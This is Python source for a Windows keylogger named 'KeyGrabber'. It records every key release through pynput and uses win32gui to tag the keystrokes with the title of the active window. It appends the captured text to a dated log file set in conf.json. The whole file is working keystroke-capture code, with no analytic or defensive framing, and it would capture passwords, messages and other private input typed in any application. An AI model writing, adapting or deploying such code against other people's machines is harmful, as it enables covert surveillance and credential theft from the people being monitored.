import keyboard,time,threading,win32gui,os,json,datetime
from pynput import keyboard

running = True
keys = ""
CurWin = ""
fulltextinWindow = []
notwriting = False
tickrunning = True
windowCheckRunning = True
SelfRunning = True

jsonpath = os.path.dirname(os.path.abspath(__file__)) + '\conf.json'
jsonfile = open(jsonpath)
jsonvals = json.load(jsonfile)
SavetoFile = jsonvals["KeyGrabber"]["Settings"]["OutputFileName"]
NoWriteDuration = jsonvals["KeyGrabber"]["Settings"]["NoWriteDuration"]

def StopKeyGrabber():
    global running
    running = False

def StartKeyGrabber():
    global running
    running = True
    Main()

def OutputKeys():
    global keys,fulltextinWindow,SavetoFile,CurWin
    if fulltextinWindow[0] != '':
        

        outstr = ""
        outstr += "[" + CurWin + "]" +"\n" + 10*"#" + "\n"


        for text in fulltextinWindow:
            outstr += text

        fulltextinWindow = []
        outstr += "\n" + 15*"-" + "\n"

        txt = open(os.path.dirname(os.path.abspath(__file__)) + SavetoFile.replace("*",datetime.datetime.now().strftime("%d-%m-%Y")),"a+")
        txt.write(outstr)
        txt.close()
    else:
        fulltextinWindow = []

def keysComplete():
    global keys,fulltextinWindow
    #ActiveWindow = "[" + win32gui.GetWindowText (win32gui.GetForegroundWindow()) + "]\n##########"
    fulltextinWindow.append(keys)
    keys = ""

def CheckForSameWindow():
    global windowCheckRunning,SelfRunning,CurWin
    while windowCheckRunning:
        CheckWindow = win32gui.GetWindowText (win32gui.GetForegroundWindow())
        SelfRunning = True
        while SelfRunning:
            if CheckWindow != win32gui.GetWindowText (win32gui.GetForegroundWindow()):
                SelfRunning = False
                keysComplete()
                CurWin = CheckWindow
                OutputKeys()
    




def tick():
    global notwriting,tickrunning,keys
    ticktimer = 0
    while tickrunning:
        while notwriting:
            time.sleep(0.1)
            ticktimer += 1
            if ticktimer >= 50:
                keysComplete()
                OutputKeys()
                keys = ""
                ticktimer = 0
        ticktimer = 0
        notwriting = True


def keypress(event):
    global keys,notwriting

    notwriting = False
    try:
        name = event.name
    except AttributeError:
        name = event.char
    try:
        if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
            if type(name) != str:
                name = "<?>"    
            elif name == "space":
                name = " "
            elif name == "backspace":
                keys = keys[:-1]
                name = ""
            elif name == "enter":
                name = "  [ENTER]\n"
                keysComplete()
            elif name == "ctrl_l":
                name = ""
            elif name == "ctrl_r":
                name = ""
            elif name == "esc":
                name = ""
            elif name == "decimal":
                name = "."
            elif name == "shift":
                name = ""
            elif name == "tab":
                name = " --> "
            elif name == "alt_gr":
                name = ""
            else:
                pass
    except TypeError:
        pass
    try:
        keys += name
    except TypeError:
        pass

def Main():
    global running,keys,tickrunning,notwriting,windowCheckRunning,SelfRunning,fulltextinWindow

    keys = ""
    fulltextinWindow = []
    notwriting = False
    tickrunning = True
    windowCheckRunning = True
    SelfRunning = True

    TickThread = threading.Thread(target=tick,daemon=True)
    TickThread.start()

    WinThread = threading.Thread(target=CheckForSameWindow,daemon=True)
    WinThread.start()

    #while running:
    listener = keyboard.Listener(
    on_release=keypress)
    listener.start()
    while running:
        pass
    listener.stop()
    tickrunning = False
    notwriting = False
    windowCheckRunning = False
    SelfRunning = False

if __name__ == "__main__":
    Main()
        